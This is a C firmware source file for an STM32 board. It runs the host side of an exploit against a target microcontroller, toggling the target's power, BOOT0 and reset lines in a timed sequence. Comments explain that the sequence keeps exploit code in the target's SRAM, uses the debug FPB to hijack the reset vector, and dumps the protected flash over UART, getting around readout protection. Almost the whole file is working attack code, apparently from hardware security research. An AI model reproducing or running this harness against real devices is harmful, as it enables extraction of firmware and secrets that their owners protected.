#include <libopencm3/stm32/rcc.h>
#include <libopencm3/stm32/gpio.h>
#include <libopencm3/stm32/usart.h>
#include <libopencm3/cm3/nvic.h>
#include <libopencm3/cm3/systick.h>
#include <libopencm3/stm32/can.h>
#include <libopencm3/stm32/iwdg.h>
#include <libopencm3/cm3/cortex.h>

#include <stdio.h>
#include <string.h>
#include <errno.h>

#include "timer.h"

const struct rcc_clock_scale rcc_hse8_72mhz =
{
	/* hse8, pll to 72 */
	.pll_mul = RCC_CFGR_PLLMUL_PLL_CLK_MUL9,
	.pll_source = RCC_CFGR_PLLSRC_HSE_CLK,
	.hpre = RCC_CFGR_HPRE_NODIV,
	.ppre1 = RCC_CFGR_PPRE_DIV2,
	.ppre2 = RCC_CFGR_PPRE_NODIV,
	.adcpre = RCC_CFGR_ADCPRE_DIV8,
	.flash_waitstates = 2,
	.prediv1 = RCC_CFGR2_PREDIV_NODIV,
	.usbpre = RCC_CFGR_USBPRE_PLL_CLK_DIV1_5,
	.ahb_frequency = 72e6,
	.apb1_frequency = 36e6,
	.apb2_frequency = 72e6,
};

#define LED_PORT GPIOC
#define LED_PIN GPIO13
void led_on (void)
{
	gpio_clear(LED_PORT, LED_PIN);
}

void led_off (void)
{
	gpio_set(LED_PORT, LED_PIN);
}

void led_setup(void)
{
	rcc_periph_clock_enable(RCC_GPIOC);

	gpio_set_mode(LED_PORT, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, LED_PIN);

	/* Switch off LED. */
	led_off();
}

struct gpio_t
{
	uint32_t rcc;
	uint32_t port;
	uint32_t pin;
};
#define GPIO_INIT(PORT,PIN) { RCC_GPIO##PORT, GPIO##PORT, GPIO##PIN }

struct gpio_t pwr0 = GPIO_INIT(A, 0);
struct gpio_t pwr1 = GPIO_INIT(A, 1);
struct gpio_t boot0 = GPIO_INIT(A, 2);
struct gpio_t rst = GPIO_INIT(A, 3);

void gpio_setup(void)
{
	rcc_periph_clock_enable(pwr0.rcc);
	rcc_periph_clock_enable(pwr1.rcc);

	gpio_set_mode(pwr0.port, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT, pwr0.pin);
	gpio_set_mode(pwr1.port, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT, pwr1.pin);
	gpio_set_mode(boot0.port, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT, boot0.pin);
	gpio_set_mode(rst.port, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT, rst.pin);
}

int main(void)
{
	cm_disable_interrupts();

	//rcc_clock_setup_pll(&rcc_hse_configs[RCC_CLOCK_HSE8_72MHZ]);
	rcc_clock_setup_pll(&rcc_hse8_72mhz);
	timer_setup();
	led_setup();
	gpio_setup();

	udelay(1);
	led_on();

	// Set BOOT0 to high and enable power
	gpio_set(pwr0.port, pwr0.pin);
	gpio_set(pwr1.port, pwr1.pin);
	gpio_set(boot0.port, boot0.pin);
	gpio_set_mode(pwr0.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, pwr0.pin);
	gpio_set_mode(pwr1.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, pwr1.pin);
	gpio_set_mode(boot0.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, boot0.pin);
	led_on();

	// Wait 10sec to ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --
	mdelay(10000);

	// Drop the power
	led_off();
	gpio_clear(pwr0.port, pwr0.pin);
	gpio_clear(pwr1.port, pwr1.pin);
	//gpio_set_mode(pwr0.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_OPENDRAIN, pwr0.pin);
	//gpio_set_mode(pwr1.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_OPENDRAIN, pwr1.pin);

	// Wait for reset to go low
	while (gpio_get(rst.port, rst.pin))
		;

	// Immediately re-enable power
	//gpio_set_mode(pwr0.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, pwr0.pin);
	//gpio_set_mode(pwr1.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, pwr1.pin);
	gpio_set(pwr0.port, pwr0.pin);
	gpio_set(pwr1.port, pwr1.pin);
	led_on();

	// Debugger lock is now disabled and we're now
	// booting from SRAM. Wait for the target to run stage 1
	// of the exploit which sets the FPB to jump to stage 2
	// when the PC reaches a reset vector fetch (0x00000004)
	mdelay(15);

	// Set BOOT0 to boot from flash. This will trick the target
	// into thinking it's running from flash, which will
	// disable readout protection.
	gpio_clear(boot0.port, boot0.pin);

	// Reset the target
	gpio_clear(rst.port, rst.pin);
	gpio_set_mode(rst.port, GPIO_MODE_OUTPUT_50_MHZ, GPIO_CNF_OUTPUT_PUSHPULL, rst.pin);

	// Wait for reset
	mdelay(15);

	// Release reset
	// Due to the FPB, the target will now jump to
	// stage 2 of the exploit and dump the contents
	// of the flash over UART
	gpio_set_mode(rst.port, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT, rst.pin);

	while (1) {

		led_on();
		mdelay(50);
		led_off();
		mdelay(950);
	}

	return 0;
}

